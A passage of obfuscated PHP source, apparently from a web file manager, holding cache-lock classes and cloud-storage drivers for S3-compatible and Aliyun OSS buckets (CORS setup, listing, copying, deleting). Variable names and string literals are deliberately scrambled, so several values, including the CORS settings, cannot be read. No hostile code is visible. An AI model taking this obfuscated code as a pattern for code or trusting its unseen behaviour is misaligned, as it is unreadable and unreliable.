$œßÒå·¬[919]: self::$handle = new CacheLockRedis(); break; case $œßÒå·¬[920]: self::$handle = new CacheLockMemcached(); break; case $œßÒå·¬[21]: self::$handle = new CacheLockDatabase(); break; case $œßÒå·¬[240]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($œßÒå·¬[932], $œßÒå·¬[933]); } return self::$handle; } private static function key($¤µÌŞŒ) { return $_SERVER[÷ôÚîå][934] . Cache::key($¤µÌŞŒ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¥±ßãèĞ = '') { self::$errorMsg = $¥±ßãèĞ; } public static function lockGlobal($ê­Ôª¨, $§ŠÆòÎö) { return self::lock($ê­Ôª¨, $§ŠÆòÎö, !0); } public static function lock($õ„ğÅìê, $ˆ¿ŞôÆ = false, $Š·ãûê = false) { $Œìãàâ¸ =& $_SERVER[÷ôÚîå]; $Ò¯êÌ”¿ = self::init(); $á†ï‡ê = self::key($õ„ğÅìê); $ˆ¿ŞôÆ = $ˆ¿ŞôÆ ? $ˆ¿ŞôÆ : self::$timeout; $˜å·Ç—‚ = timeFloat(); $èÜäìÔ² = $Ò¯êÌ”¿->lock($á†ï‡ê, $ˆ¿ŞôÆ); $¸å¾÷³é = timeFloat(); if (!$èÜäìÔ²) { $Á×¦›î„ = "\x6c\157\x63\x6b\40\x65\x72\162\157\162\x3b\153\x65\x79\75{$õ„ğÅìê}\x3b\x74\151\x6d\x65\x3d{$ˆ¿ŞôÆ}\x3b" . self::$errorMsg . $Œìãàâ¸[84] . get_caller_msg(); $ùÕ»ÇÀ = LNG($Œìãàâ¸[935]) . "\x28{$ˆ¿ŞôÆ}\x73\x29\56" . LNG($Œìãàâ¸[936]); $ùÕ»ÇÀ .= $Œìãàâ¸[937]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ùÕ»ÇÀ = $ùÕ»ÇÀ . $Œìãàâ¸[938] . self::$errorMsg; } write_log($Œìãàâ¸[939] . sprintf($Œìãàâ¸[940], timeFloat() - $˜å·Ç—‚) . $Œìãàâ¸[941] . $Á×¦›î„ . $Œìãàâ¸[942] . error_get_last(), $Œìãàâ¸[933]); show_json($ùÕ»ÇÀ, !1); } if (!$Š·ãûê) { self::$lockItem[$á†ï‡ê] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ùû¨üƒØ = number_format(timeFloat() - $¸å¾÷³é, 3); write_log($Œìãàâ¸[943] . $õ„ğÅìê . $Œìãàâ¸[944] . $ùû¨üƒØ, $Œìãàâ¸[933]); } return $èÜäìÔ²; } public static function lockGet($Ü¢ßÆÒ×) { $åá·úœÅ = self::key($Ü¢ßÆÒ×); if (self::$lockItem[$åá·úœÅ]) { return self::$lockItem[$åá·úœÅ]; } return self::init()->lockGet($åá·úœÅ); } public static function unlock($¤Û—–±²) { $˜¥±­’ =& $_SERVER[÷ôÚîå]; $˜‹úõğû = self::key($¤Û—–±²); self::$lockItem[$˜‹úõğû] = null; self::init()->unlock($˜‹úõğû); if (GLOBAL_DEBUG_LOG_ALL) { write_log($˜¥±­’[945] . $¤Û—–±², $˜¥±­’[933]); } return; } public static function unlockRuntime() { $š©™»²µ =& $_SERVER[÷ôÚîå]; $±ú€æ—• = self::init(); $‹£¼ñ”Ÿ = !1; foreach (self::$lockItem as $üà˜Ê´É => $±„£Ó·®) { if (!$±„£Ó·®) { continue; } $±ú€æ—•->unlock($üà˜Ê´É); if (!$‹£¼ñ”Ÿ) { $‹£¼ñ”Ÿ = !0; write_log($š©™»²µ[946] . $üà˜Ê´É . $š©™»²µ[84] . get_caller_msg(), $š©™»²µ[933]); continue; } write_log($š©™»²µ[946] . $üà˜Ê´É, $š©™»²µ[933]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Î„úß•¼ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($š©™»²µ[947] . $Î„úß•¼ . $š©™»²µ[948] . ACTION, $š©™»²µ[933]); } } public static function fileLock($´ï½¢–à) { $ó‹ƒæÙú =& $_SERVER[÷ôÚîå]; if (!$GLOBALS[$ó‹ƒæÙú[949]]) { $GLOBALS[$ó‹ƒæÙú[949]] = array(); } $GLOBALS[$ó‹ƒæÙú[949]][$´ï½¢–à] = !1; $Ó©ã§‰ª = fopen(DATA_PATH . $´ï½¢–à . $ó‹ƒæÙú[950], $ó‹ƒæÙú[951]); if (!$Ó©ã§‰ª) { return !1; } $GLOBALS[$ó‹ƒæÙú[949]][$´ï½¢–à] = $Ó©ã§‰ª; if (flock($Ó©ã§‰ª, LOCK_EX)) { return !0; } self::unlock($´ï½¢–à); show_json($ó‹ƒæÙú[952], !1); return !1; } public static function fileUnlock($¤šßæÜ·) { $Æè³ü‹ë =& $_SERVER[÷ôÚîå]; $‚“‚¥¾ = $GLOBALS[$Æè³ü‹ë[949]][$¤šßæÜ·]; if (!$‚“‚¥¾) { return; } $GLOBALS[$Æè³ü‹ë[949]][$¤šßæÜ·] = !1; flock($‚“‚¥¾, LOCK_UN); fclose($‚“‚¥¾); } public static function fileUnlockAll() { $í£ã¼Ù =& $_SERVER[÷ôÚîå]; if (!isset($GLOBALS[$í£ã¼Ù[949]]) || !$GLOBALS[$í£ã¼Ù[949]]) { return; } foreach ($GLOBALS[$í£ã¼Ù[949]] as $•¼ëù­á => $Õ•é±¢›) { if (!$Õ•é±¢›) { continue; } $GLOBALS[$í£ã¼Ù[949]][$•¼ëù­á] = !1; flock($Õ•é±¢›, LOCK_UN); fclose($Õ•é±¢›); } $GLOBALS[$í£ã¼Ù[949]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ë´˜şÏ =& $_SERVER[÷ôÚîå]; $ÁÎ êå  = $GLOBALS[$Ë´˜şÏ[6]][$Ë´˜şÏ[434]]; self::$cachePath = $ÁÎ êå [$Ë´˜şÏ[240]][$Ë´˜şÏ[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÎôµÈğŞ, $ô×ö‰ŞÊ = 0) { $ƒë×±–« =& $_SERVER[÷ôÚîå]; $¾Ä±© Ï = microtime(!0); $Á×Í›ô = $¾Ä±© Ï + $ô×ö‰ŞÊ + 0.0001; $±Çá´êê = rtrim(self::$cachePath, $ƒë×±–«[8]) . $ƒë×±–«[953] . md5($ÎôµÈğŞ) . $ƒë×±–«[950]; if (file_exists($±Çá´êê) && filemtime($±Çá´êê) && filemtime($±Çá´êê) < time() - 10) { @unlink($±Çá´êê); } do { if (file_exists($±Çá´êê)) { cacheLockWait(); continue; } $ü‘¢‹ó¿ = fopen($±Çá´êê, $ƒë×±–«[954]); if (!$ü‘¢‹ó¿) { return !1; } $ıª–Ùé = flock($ü‘¢‹ó¿, LOCK_EX | LOCK_NB); self::$caches[$ÎôµÈğŞ] = array($ƒë×±–«[955] => $ü‘¢‹ó¿, $ƒë×±–«[240] => $±Çá´êê); fwrite($ü‘¢‹ó¿, $Á×Í›ô); clearstatcache(); if ($ü‘¢‹ó¿ && $ıª–Ùé) { return !0; } cacheLockWait(); } while (microtime(!0) < $Á×Í›ô); $this->unlock($ÎôµÈğŞ); return !1; } public function lockGet($¾êä¥‰) { $ê¾âîŞ€ =& $_SERVER[÷ôÚîå]; $’Ü—Ğ  = rtrim(self::$cachePath, $ê¾âîŞ€[8]) . $ê¾âîŞ€[953] . md5($¾êä¥‰) . $ê¾âîŞ€[950]; return file_exists($’Ü—Ğ ); } public function unlock($ƒõŞÌÔÜ) { $ïò¶Éú =& $_SERVER[÷ôÚîå]; $ıÓğšÌ = self::$caches[$ƒõŞÌÔÜ]; if (!$ıÓğšÌ) { return; } @flock($ıÓğšÌ[$ïò¶Éú[955]], LOCK_UN); @fclose($ıÓğšÌ[$ïò¶Éú[955]]); @unlink($ıÓğšÌ[$ïò¶Éú[240]]); unset(self::$caches[$ƒõŞÌÔÜ]); } } goto F‹äõÙŸóª; aÈÉÄù•™œ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ÿ¶æ€Ê¶) { parent::__construct($Ÿ¶æ€Ê¶); $this->setSignVersion($_SERVER[÷ôÚîå][257]); } public function fileOutLink($‡³ƒ˜Ù÷) { $é²¨Ùïå =& $_SERVER[÷ôÚîå]; if (substr($‡³ƒ˜Ù÷, 0, 7) == $é²¨Ùïå[322]) { $‡³ƒ˜Ù÷ = $é²¨Ùïå[323] . substr($‡³ƒ˜Ù÷, 7); } header($é²¨Ùïå[185] . $‡³ƒ˜Ù÷); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($’‹£à§†) { parent::__construct(); include_once SDK_DIR . $_SERVER[÷ôÚîå][1471]; $this->_init($’‹£à§†); } public function _init($«Âİø‡ë) { $øÉØÅ„Ñ =& $_SERVER[÷ôÚîå]; $this->config = $«Âİø‡ë; foreach ($«Âİø‡ë as $ÒĞĞÕˆÁ => $ğÉ¤ñ³€) { if (isset($this->{$ÒĞĞÕˆÁ})) { $this->{$ÒĞĞÕˆÁ} = $ğÉ¤ñ³€; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($øÉØÅ„Ñ[1472] . LNG($øÉØÅ„Ñ[1473])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ıéõÑÉÃ =& $_SERVER[÷ôÚîå]; $Ü©‹š»” = new OSS\Model\CorsConfig(); $öá¸±ˆú = new OSS\Model\CorsRule(); $öá¸±ˆú->addAllowedOrigin($ıéõÑÉÃ[1474]); $öá¸±ˆú->addAllowedMethod($ıéõÑÉÃ[1475]); $öá¸±ˆú->addAllowedMethod($ıéõÑÉÃ[1476]); $öá¸±ˆú->addAllowedMethod($ıéõÑÉÃ[1477]); $öá¸±ˆú->addAllowedMethod($ıéõÑÉÃ[1478]); $öá¸±ˆú->addAllowedMethod($ıéõÑÉÃ[175]); $öá¸±ˆú->setMaxAgeSeconds(600); $öá¸±ˆú->addExposeHeader($ıéõÑÉÃ[1479]); $öá¸±ˆú->addAllowedHeader($ıéõÑÉÃ[1474]); $Ü©‹š»”->addRule($öá¸±ˆú); try { $this->client->putBucketCors($this->bucket, $Ü©‹š»”); } catch (OSS\Core\OssException $Ç±øå÷) { $this->writeLog(__FUNCTION__ . $ıéõÑÉÃ[224] . $Ç±øå÷->getMessage()); return !1; } return !0; } public function getBucketCors() { $Ã©‚ì”ã =& $_SERVER[÷ôÚîå]; $éÃ£Áµ» = null; try { $éÃ£Áµ» = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ı‹×€Ú—) { $this->writeLog(__FUNCTION__ . $Ã©‚ì”ã[224] . $ı‹×€Ú—->getMessage()); return null; } if (!$éÃ£Áµ» || !($ª„…Şˆ = $éÃ£Áµ»->getRules())) { return null; } $¦²å×»² = $ª„…Şˆ[0]->getAllowedOrigins(); $æ†—¹™È = $ª„…Şˆ[0]->getAllowedMethods(); $™ë™š¼² = $ª„…Şˆ[0]->getMaxAgeSeconds(); $™¢¼£ÛÛ = $ª„…Şˆ[0]->getExposeHeaders(); $“‹Ÿãûá = $ª„…Şˆ[0]->getAllowedHeaders(); return array($Ã©‚ì”ã[228] => isset($¦²å×»²[0]) ? $¦²å×»²[0] : $Ã©‚ì”ã[12], $Ã©‚ì”ã[232] => $æ†—¹™È, $Ã©‚ì”ã[1480] => $™ë™š¼², $Ã©‚ì”ã[1481] => isset($™¢¼£ÛÛ[0]) ? $™¢¼£ÛÛ[0] : $Ã©‚ì”ã[12], $Ã©‚ì”ã[229] => isset($“‹Ÿãûá[0]) ? $“‹Ÿãûá[0] : $Ã©‚ì”ã[12]); } public function isBucketCors() { $ßÒÅîÃ =& $_SERVER[÷ôÚîå]; $€€´ùÍ = $this->getBucketCors(); if (!$€€´ùÍ || !is_array($€€´ùÍ)) { return !1; } if ($€€´ùÍ[$ßÒÅîÃ[228]] != $ßÒÅîÃ[230] || $€€´ùÍ[$ßÒÅîÃ[229]] != $ßÒÅîÃ[230]) { return !1; } $‰™úÓˆÊ = array_map($ßÒÅîÃ[231], $€€´ùÍ[$ßÒÅîÃ[232]]); if (!is_array($‰™úÓˆÊ)) { $‰™úÓˆÊ = array(); } $ßİü³èò = array($ßÒÅîÃ[233], $ßÒÅîÃ[234], $ßÒÅîÃ[235], $ßÒÅîÃ[236], $ßÒÅîÃ[237]); $«½Õ„Áµ = array_diff($ßİü³èò, $‰™úÓˆÊ); return empty($«½Õ„Áµ); } public function mkfile($èÜÎ½Ñ„, $†ÕôÃÉ¶ = '', $äÀÚüÀÄ = REPEAT_RENAME) { $™Ì¹ûé = $this->setContent($èÜÎ½Ñ„, $†ÕôÃÉ¶); if ($™Ì¹ûé !== !1) { return $this->getPathOuter($èÜÎ½Ñ„); } return !1; } public function mkdir($÷×“ıÖó, $›ıó¾Ş = REPEAT_SKIP) { if ($›ıó¾Ş && $this->_isFolder($÷×“ıÖó)) { return $this->getPathOuter($÷×“ıÖó); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($÷×“ıÖó)); } catch (OSS\Core\OssException $˜â”Ô·°) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][224] . $˜â”Ô·°->getMessage()); return !1; } return $this->getPathOuter($÷×“ıÖó); } private function fileList($„°öªÕ, $©ÓŸ½Ú = '', $ÁñÑ×Àò = 0) { $Ó¿¿‡Àá =& $_SERVER[÷ôÚîå]; $„°öªÕ = trim($„°öªÕ, $Ó¿¿‡Àá[8]); $ñµúù› = empty($„°öªÕ) && $„°öªÕ !== $Ó¿¿‡Àá[238] ? $Ó¿¿‡Àá[12] : $„°öªÕ . $Ó¿¿‡Àá[8]; $÷ä»À³Œ = $Ó¿¿‡Àá[12]; $†…ÉÆƒò = 1000; $ã¡ïÓ = $¼ğ­‘Å = array(); while (!0) { check_abort(); $íÍ¬¸Ï­ = array($Ó¿¿‡Àá[1482] => $©ÓŸ½Ú, $Ó¿¿‡Àá[1483] => $ñµúù›, $Ó¿¿‡Àá[1484] => $†…ÉÆƒò, $Ó¿¿‡Àá[1485] => $÷ä»À³Œ); try { $öˆÇü¢ = $this->client->listObjects($this->bucket, $íÍ¬¸Ï­); } catch (OSS\Core\OssException $Ùˆ†Şµ) { $this->writeLog(__FUNCTION__ . $Ó¿¿‡Àá[224] . $Ùˆ†Şµ->getMessage()); break; } $÷ä»À³Œ = $öˆÇü¢->getNextMarker(); $¡ËÊıÖŒ = $öˆÇü¢->getObjectList(); $åùì×˜  = $öˆÇü¢->getPrefixList(); foreach ($¡ËÊıÖŒ as $õóÊòÄ–) { if ($õóÊòÄ–->getKey() == $ñµúù›) { continue; } $×ä°ƒòê = $õóÊòÄ–->getKey(); $½•‰é­ô = $õóÊòÄ–->getSize(); $à¹İÄº· = $õóÊòÄ–->getLastModified(); $¬ÒÖ³˜ = trim($õóÊòÄ–->getETag(), $Ó¿¿‡Àá[131]); $Ó­ê¶´ô = $ÁñÑ×Àò ? array($Ó¿¿‡Àá[32] => $×ä°ƒòê, $Ó¿¿‡Àá[89] => $½•‰é­ô, $Ó¿¿‡Àá[216] => strtotime($à¹İÄº·), $Ó¿¿‡Àá[1486] => $¬ÒÖ³˜) : $×ä°ƒòê; $ìıÎ—Øä = $½•‰é­ô == 0 && substr($×ä°ƒòê, strlen($×ä°ƒòê) - 1, 1) == $Ó¿¿‡Àá[8] ? !0 : !1; $·Š’½ÄÒ = array($Ó¿¿‡Àá[89] => $½•‰é­ô, $Ó¿¿‡Àá[1487] => $½•‰é­ô, $Ó¿¿‡Àá[98] => strtotime($à¹İÄº·), $Ó¿¿‡Àá[1488] => $à¹İÄº·, $Ó¿¿‡Àá[1486] => $¬ÒÖ³˜); $this->cacheMethodInfoSet($×ä°ƒòê, $ìıÎ—Øä, $·Š’½ÄÒ); if ($ìıÎ—Øä) { $ã¡ïÓ[] = $×ä°ƒòê; continue; } $¼ğ­‘Å[] = $Ó­ê¶´ô; } foreach ($åùì×˜  as $õªÏ®ÀÁ) { $ã¡ïÓ[] = $õªÏ®ÀÁ->getPrefix(); $this->cacheMethodInfoSet($õªÏ®ÀÁ->getPrefix(), !0); } if ($÷ä»À³Œ === $Ó¿¿‡Àá[12]) { break; } } $this->cacheMethodInfoSet($„°öªÕ, !0); return array($Ó¿¿‡Àá[95] => $ã¡ïÓ, $Ó¿¿‡Àá[96] => $¼ğ­‘Å); } public function listObject($õ¿—§İ”, $è“ê›Ê˜ = '') { $‹Ã‹Ì¸Ü =& $_SERVER[÷ôÚîå]; $õ¿—§İ” = trim($õ¿—§İ”, $‹Ã‹Ì¸Ü[8]); $Ûê–ØÜç = empty($õ¿—§İ”) && $õ¿—§İ” !== $‹Ã‹Ì¸Ü[238] ? $‹Ã‹Ì¸Ü[12] : $õ¿—§İ” . $‹Ã‹Ì¸Ü[8]; $Ç¤’æ‡¼ = $‹Ã‹Ì¸Ü[12]; $”³´ËÕ° = 1000; $ÙŸ™Ôõæ = $ä¾÷€¡‹ = array(); while (!0) { check_abort(); $…›„§—£ = array($‹Ã‹Ì¸Ü[1482] => $è“ê›Ê˜, $‹Ã‹Ì¸Ü[1483] => $Ûê–ØÜç, $‹Ã‹Ì¸Ü[1484] => $”³´ËÕ°, $‹Ã‹Ì¸Ü[1485] => $Ç¤’æ‡¼); try { $æúˆóÄ = $this->client->listObjects($this->bucket, $…›„§—£); } catch (OSS\Core\OssException $‘Ï©Ò’) { $this->writeLog(__FUNCTION__ . $‹Ã‹Ì¸Ü[224] . $‘Ï©Ò’->getMessage()); break; } $Ç¤’æ‡¼ = $æúˆóÄ->getNextMarker(); $Ó”¦·¼Ù = $æúˆóÄ->getObjectList(); foreach ($Ó”¦·¼Ù as $¬È¼ÑÌÚ) { if ($¬È¼ÑÌÚ->getKey() == $Ûê–ØÜç) { continue; } $¾Ÿê˜ªŒ = $¬È¼ÑÌÚ->getKey(); $µóºŞŸ¶ = $¬È¼ÑÌÚ->getSize(); $šíĞİÜ = $µóºŞŸ¶ == 0 && substr($¾Ÿê˜ªŒ, strlen($¾Ÿê˜ªŒ) - 1, 1) == $‹Ã‹Ì¸Ü[8] ? !0 : !1; if ($šíĞİÜ) { continue; } (yield $µóºŞŸ¶ . $‹Ã‹Ì¸Ü[224] . $¾Ÿê˜ªŒ); } if ($Ç¤’æ‡¼ === $‹Ã‹Ì¸Ü[12]) { break; } } } public function copyFile($Ô‘Ãğƒõ, $ı¸×İ¬) { $ÆöÈò‡á = $this->size($Ô‘Ãğƒõ); if ($ÆöÈò‡á < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ô‘Ãğƒõ, $this->bucket, $this->pathEncode($ı¸×İ¬)); } catch (OSS\Core\OssException $‡İ©äí) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][224] . $‡İ©äí->getMessage()); return !1; } return $this->getPathOuter($ı¸×İ¬); } $ı³”™¥¯ = $this->multiCopyObject($Ô‘Ãğƒõ, $ı¸×İ¬, $ÆöÈò‡á); return $ı³”™¥¯ ? $this->getPathOuter($ı¸×İ¬) : !1; } private function multiCopyObject($—‘‚•©•, $ÅÁªşŞ¢, $Î‘à®¦Á) { $·Ö’ÈÒŞ =& $_SERVER[÷ôÚîå]; try { $áÑÌğ° = array(); if ($¿’¸Áàù = $this->hashMd5($—‘‚•©•)) { $áÑÌğ° = array(OSS\OssClient::OSS_HEADERS => array($·Ö’ÈÒŞ[1489] => $¿’¸Áàù)); } $¿¸€ûÊÊ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÅÁªşŞ¢), $áÑÌğ°); $—µ–° = 1; $»Š™ğÙä = 0; $×éä÷Â¤ = array(); $‰Â¼¤½ = 1024 * 1024 * 10; $µÑ¶À‘• = $this->client->generateMultiuploadParts($Î‘à®¦Á, $‰Â¼¤½); foreach ($µÑ¶À‘• as $¥Ñ—›œ  => $í¶¦à¡„) { $Ô«ÈÔ‘ = $»Š™ğÙä + (int) $í¶¦à¡„[$·Ö’ÈÒŞ[1490]]; $ò¨µ‚ƒé = (int) $í¶¦à¡„[$·Ö’ÈÒŞ[422]] + $Ô«ÈÔ‘ - 1; $÷ûôÈ„ê = array($·Ö’ÈÒŞ[177] => $Ô«ÈÔ‘, $·Ö’ÈÒŞ[178] => $ò¨µ‚ƒé); $×éä÷Â¤[] = $this->client->uploadPartCopy($this->bucket, $—‘‚•©•, $this->bucket, $this->pathEncode($ÅÁªşŞ¢), $—µ–°, $¿¸€ûÊÊ, $÷ûôÈ„ê); $—µ–° = $—µ–° + 1; } $ª«§‚¥™ = array(); foreach ($×éä÷Â¤ as $¥Ñ—›œ  => $®ü‚Ù) { $ª«§‚¥™[] = array($·Ö’ÈÒŞ[317] => $¥Ñ—›œ  + 1, $·Ö’ÈÒŞ[318] => $®ü‚Ù); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÅÁªşŞ¢), $¿¸€ûÊÊ, $ª«§‚¥™); } catch (OSS\Core\OssException $•÷¿âÇò) { $this->writeLog(__FUNCTION__ . $·Ö’ÈÒŞ[224] . $•÷¿âÇò->getMessage()); return !1; } return !0; } public function moveFile($™ö¨áŞ, $£Ìè¯Àø) { if ($this->copyFile($™ö¨áŞ, $£Ìè¯Àø)) { $this->remove($™ö¨áŞ); return $this->getPathOuter($£Ìè¯Àø); } return !1; } public function delFile($áç¶ìÏş) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($áç¶ìÏş)); } catch (OSS\Core\OssException $„Šƒù’²) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][224] . $„Šƒù’²->getMessage()); return !1; } return !0; } public function delFolder($Çë‰¤È¸) { $ù€×áı÷ =& $_SERVER[÷ôÚîå]; if (!$this->exist($Çë‰¤È¸)) { return !0; } $this->listItemCache = !1; $­›¢ıãï = $this->fileList($Çë‰¤È¸); $this->listItemCache = !0; $–‚åÇßõ = trim($Çë‰¤È¸, $ù€×áı÷[8]) . $ù€×áı÷[8]; if (!empty($Çë‰¤È¸) && $Çë‰¤È¸ !== $ù€×áı÷[238] && !in_array($–‚åÇßõ, $­›¢ıãï[$ù€×áı÷[95]])) { $­›¢ıãï[$ù€×áı÷[95]][] = $–‚åÇßõ; } $İúş†ç™ = $this->delByBatch($­›¢ıãï[$ù€×áı÷[96]]); if (!$İúş†ç™) { return !1; } $İúş†ç™ = $this->delByBatch($­›¢ıãï[$ù€×áı÷[95]]); if (!$İúş†ç™) { return !1; } return $this->delFile($–‚åÇßõ); } private function delByBatch($‡ƒËÓæ€) { foreach (array_chunk($‡ƒËÓæ€, 1000) as $šº½‰ïì) { try { $this->client->deleteObjects($this->bucket, $šº½‰ïì); } catch (OSS\Core\OssException $­ûƒ¹˜) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][224] . $­ûƒ¹˜->getMessage()); return !1; } } return !0; } public function rename($İíæËÎ, $Œ…ÔÛ÷¨) { return $this->renameObject($İíæËÎ, $Œ…ÔÛ÷¨); } private function fileInfo($úß½é£, $ÛãŠğû— = false, $¼€²ò = array()) { $ÜİœĞ›ü =& $_SERVER[÷ôÚîå]; $ì—Íä‹ = array($ÜİœĞ›ü[32] => $this->pathThis($úß½é£), $ÜİœĞ›ü[97] => $this->getPathOuter($úß½é£), $ÜİœĞ›ü[33] => $ÜİœĞ›ü[240], $ÜİœĞ›ü[89] => isset($¼€²ò[$ÜİœĞ›ü[89]]) ? $¼€²ò[$ÜİœĞ›ü[89]] : 0, $ÜİœĞ›ü[179] => $this->ext($úß½é£)); if ($ÛãŠğû—) { return $ì—Íä‹; } $ì—Íä‹[$ÜİœĞ›ü[241]] = $ì—Íä‹[$ÜİœĞ›ü[98]] = 0; $ì—Íä‹[$ÜİœĞ›ü[242]] = $ì—Íä‹[$ÜİœĞ›ü[243]] = !0; if (empty($¼€²ò)) { $©ò „Ö = $this->objectMeta($úß½é£); if (!$©ò „Ö) { return $ì—Íä‹; } $¼€²ò = array($ÜİœĞ›ü[98] => strtotime($©ò „Ö[$ÜİœĞ›ü[1488]]), $ÜİœĞ›ü[89] => $©ò „Ö[$ÜİœĞ›ü[1487]] + 0, $ÜİœĞ›ü[1486] => $©ò „Ö[$ÜİœĞ›ü[1486]]); } if (isset($¼€²ò[$ÜİœĞ›ü[1486]]) && $¼€²ò[$ÜİœĞ›ü[1486]]) { $ì—Íä‹[$ÜİœĞ›ü[245]] = trim($¼€²ò[$ÜİœĞ›ü[1486]], $ÜİœĞ›ü[131]); } if (isset($¼€²ò[$ÜİœĞ›ü[89]])) { $ì—Íä‹[$ÜİœĞ›ü[89]] = $¼€²ò[$ÜİœĞ›ü[89]]; } if (isset($¼€²ò[$ÜİœĞ›ü[98]])) { $ì—Íä‹[$ÜİœĞ›ü[98]] = $¼€²ò[$ÜİœĞ›ü[98]]; } if (isset($¼€²ò[$ÜİœĞ›ü[216]]) && !trim($ì—Íä‹[$ÜİœĞ›ü[98]])) { $ì—Íä‹[$ÜİœĞ›ü[98]] = $¼€²ò[$ÜİœĞ›ü[216]]; } return $ì—Íä‹; } private function folderInfo($›èÊ¥õù, $íé§¦Èš = false, $âÙæ‡Àİ = array()) { $Í‚ÜÌÓ =& $_SERVER[÷ôÚîå]; $ÄûâŸ¿Œ = array($Í‚ÜÌÓ[32] => $this->pathThis($›èÊ¥õù), $Í‚ÜÌÓ[97] => $this->getPathOuter($Í‚ÜÌÓ[8] . $›èÊ¥õù), $Í‚ÜÌÓ[33] => $Í‚ÜÌÓ[88]); if ($íé§¦Èš) { return $ÄûâŸ¿Œ; } $ÄûâŸ¿Œ[$Í‚ÜÌÓ[241]] = $ÄûâŸ¿Œ[$Í‚ÜÌÓ[98]] = 0; $ÄûâŸ¿Œ[$Í‚ÜÌÓ[242]] = $ÄûâŸ¿Œ[$Í‚ÜÌÓ[243]] = !0; if (empty($âÙæ‡Àİ)) { $›èÊ¥õù = rtrim($›èÊ¥õù, $Í‚ÜÌÓ[8]) . $Í‚ÜÌÓ[8]; $òïÒ‰à´ = $this->objectMeta($›èÊ¥õù); if (!$òïÒ‰à´) { return $ÄûâŸ¿Œ; } $âÙæ‡Àİ = array($Í‚ÜÌÓ[241] => $òïÒ‰à´[$Í‚ÜÌÓ[584]][$Í‚ÜÌÓ[1491]], $Í‚ÜÌÓ[98] => strtotime($òïÒ‰à´[$Í‚ÜÌÓ[1488]])); } if (isset($âÙæ‡Àİ[$Í‚ÜÌÓ[98]])) { $ÄûâŸ¿Œ[$Í‚ÜÌÓ[98]] = $âÙæ‡Àİ[$Í‚ÜÌÓ[98]]; } if (isset($âÙæ‡Àİ[$Í‚ÜÌÓ[241]])) { $ÄûâŸ¿Œ[$Í‚ÜÌÓ[241]] = $âÙæ‡Àİ[$Í‚ÜÌÓ[241]]; } return $ÄûâŸ¿Œ; } public function listPath($Ö×ùî, $¼¨ÅÊÕà = false) { $•È£€ =& $_SERVER[÷ôÚîå]; $Š’³ª½µ = $this->fileList($Ö×ùî, $•È£€[8], !0); foreach ($Š’³ª½µ[$•È£€[95]] as $ƒßûöÖ => $•Âå¿ª¯) { $Š’³ª½µ[$•È£€[95]][$ƒßûöÖ] = $this->folderInfo($•Âå¿ª¯, $¼¨ÅÊÕà, $•Âå¿ª¯); } foreach ($Š’³ª½µ[$•È£€[96]] as $ƒßûöÖ => $•Âå¿ª¯) { $Š’³ª½µ[$•È£€[96]][$ƒßûöÖ] = $this->fileInfo($•Âå¿ª¯[$•È£€[32]], $¼¨ÅÊÕà, $•Âå¿ª¯); } return $Š’³ª½µ; } protected function infoChildren($ïí‹Ò¬Œ, &$Œ‚ÚŒƒ) { $ùÊÀ…¼· =& $_SERVER[÷ôÚîå]; $ì„“œ‚ë = $this->fileList($ïí‹Ò¬Œ, $ùÊÀ…¼·[12], !0); $Œ‚ÚŒƒ[$ùÊÀ…¼·[91]] += count($ì„“œ‚ë[$ùÊÀ…¼·[95]]); $Œ‚ÚŒƒ[$ùÊÀ…¼·[90]] += count($ì„“œ‚ë[$ùÊÀ…¼·[96]]); foreach ($ì„“œ‚ë[$ùÊÀ…¼·[96]] as $»ëå¯ûÂ) { if (!$»ëå¯ûÂ || !$»ëå¯ûÂ[$ùÊÀ…¼·[89]]) { continue; } $Œ‚ÚŒƒ[$ùÊÀ…¼·[89]] += $»ëå¯ûÂ[$ùÊÀ…¼·[89]]; } } public function has($è”ñÄÃÇ, $ŠâÃ©É¹ = false, $·ëÕô¼¸ = true) { $ÉŒ„åÑ =& $_SERVER[÷ôÚîå]; $è”ñÄÃÇ = trim($è”ñÄÃÇ, $ÉŒ„åÑ[8]); $Ëè—™† = empty($è”ñÄÃÇ) && $è”ñÄÃÇ !== $ÉŒ„åÑ[238] ? $ÉŒ„åÑ[12] : $è”ñÄÃÇ . $ÉŒ„åÑ[8]; $Ó§ƒ©Œ¥ = $ÉŒ„åÑ[12]; $´´ã­İ = 500; $øÆÑç“Ç = $ğİôÜß× = 0; while (!0) { check_abort(); $Å‚ãÒÏ˜ = array($ÉŒ„åÑ[1482] => $ÉŒ„åÑ[8], $ÉŒ„åÑ[1483] => $Ëè—™†, $ÉŒ„åÑ[1484] => $´´ã­İ, $ÉŒ„åÑ[1485] => $Ó§ƒ©Œ¥); try { $©¿Ø—³Â = $this->client->listObjects($this->bucket, $Å‚ãÒÏ˜); } catch (OSS\Core\OssException $ç¾•ÄÃ‚) { $this->writeLog(__FUNCTION__ . $ÉŒ„åÑ[224] . 